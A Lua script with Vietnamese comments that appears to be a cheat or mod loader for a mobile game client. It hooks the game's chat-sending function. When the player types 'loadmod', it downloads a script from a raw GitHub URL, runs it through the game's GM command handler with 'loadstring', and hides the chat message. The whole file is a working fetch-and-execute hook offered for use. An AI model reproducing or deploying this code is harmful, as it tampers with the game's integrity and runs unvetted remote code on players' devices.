-- =============================================================
-- FILE: init_cloud.lua (TRÊN GITHUB) - INSTANCE HOOK
-- =============================================================

-- Hàm Notify chuẩn của bạn
local function Notify(msg)
    pcall(function()
        local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
        if IngameTipsTools and IngameTipsTools.BattleNormalTips then
            IngameTipsTools.BattleNormalTips("Lexusmod: " .. msg, 2, 4)
        end
    end)
end

-- Hàm thực hiện truy tìm và cài Hook vào Thực thể Chat
local function InstallInstanceHook()
    -- 1. Lấy dữ liệu người chơi
    local s, GameplayData = pcall(require, "GameLua.GameCore.Data.GameplayData")
    if not s or not GameplayData then return false end
    
    local PlayerController = GameplayData.GetPlayerController()
    if not slua.isValid(PlayerController) then return false end
    
    -- 2. Dùng bí kíp của bạn: Rút ChatComponent từ Controller
    local ChatComp = PlayerController:GetChatComponent()
    if not slua.isValid(ChatComp) then return false end
    
    -- 3. Tiến hành cấy Hook trực tiếp vào Thực thể (Instance) này
    if not _G.Lexus_InstanceChatHooked then
        _G.Original_SendDirtyFilterLua = ChatComp.SendDirtyFilterLua
        
        ChatComp.SendDirtyFilterLua = function(self, DirtyString, PrefixString, UID, bNeedTranslate)
            local content = string.lower(tostring(DirtyString or ""))
            
            -- NHẬN DIỆN LỆNH LOADMOD
            if string.find(content, "loadmod") then
                Notify("Đã nhận lệnh từ Instance! Đang tải Script...")
                
                local AWSHelper = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.AWSHelper)
                if AWSHelper then
                    local URL = "https://raw.githubusercontent.com/khoanguyennoob/luascript/refs/heads/main/script.lua?t=" .. os.time()
                    AWSHelper:DownloadBinary(URL, function(res)
                        if res:IsOK() then
                            -- Thực thi Script
                            pcall(function()
                                require("GameLua.Mod.BaseMod.Client.ClientCloudGM").HandleCloudGMCMDStr("loadstring\n" .. res:GetContent())
                            end)
                            
                            -- Hẹn 2 giây sau báo thành công
                            local time_ticker = require("common.time_ticker")
                            time_ticker.AddTimerOnce(2, function()
                                Notify("Kích hoạt Mod hoàn tất!")
                            end)
                        end
                    end)
                end
                return -- Chặn không cho tin nhắn gửi đi
            end
            
            -- Nếu không phải lệnh, gửi chat đi bình thường
            if _G.Original_SendDirtyFilterLua then
                return _G.Original_SendDirtyFilterLua(self, DirtyString, PrefixString, UID, bNeedTranslate)
            end
        end
        
        _G.Lexus_InstanceChatHooked = true
        Notify("Đã gắn bọ vào Chat In-game! Gõ 'loadmod'")
    end
    
    return true -- Trả về true báo hiệu đã Hook thành công
end

-- VÒNG LẶP SĂN TÌM: Đợi nhân vật thực sự sẵn sàng
local function WaitAndHook()
    -- Nếu InstallInstanceHook trả về false (nhân vật chưa rớt xuống đất hoặc chưa load xong)
    if not InstallInstanceHook() then
        -- Đợi 1 giây rồi thử lại
        local time_ticker = require("common.time_ticker")
        time_ticker.AddTimerOnce(1, WaitAndHook)
    end
end

-- Khởi động máy dò
pcall(WaitAndHook)
